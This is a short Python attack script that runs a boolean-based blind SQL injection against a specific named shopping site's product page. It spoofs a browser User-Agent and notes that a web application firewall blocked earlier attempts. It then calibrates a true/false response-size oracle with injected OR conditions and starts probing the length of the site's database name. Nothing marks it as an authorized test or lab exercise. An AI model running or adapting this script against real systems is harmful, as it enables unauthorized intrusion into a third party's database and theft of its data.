#!/usr/bin/env python3
"""yijingweb boolean blind - re-test oracle then extract DB name
Oracle: true ~22793, false ~4374 (WAF blocked) - need fresh calibration
"""
import urllib.request, urllib.parse, string, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000))
    except Exception:
        return 0, 0

def sz(payload):
    code, size = fetch(BASE + "?id=686" + payload)
    return size

print("=== oracle calibration (fresh) ===")
for p, tag in [
    ("", "base"),
    ("%27", "quote"),
    ("%27%20OR%20(select%201)=1--%20", "or-true"),
    ("%27%20OR%20(select%201)=2--%20", "or-false"),
    ("%27%20OR%20(select%20length(database()))=1--%20", "db-len1"),
    ("%27%20OR%20(select%20length(database()))=6--%20", "db-len6"),
    ("%27%20OR%20(select%20length(database()))=7--%20", "db-len7"),
]:
    sizes = [sz(p) for _ in range(2)]
    print("  %-14s %s" % (tag, sizes))
    time.sleep(0.4)
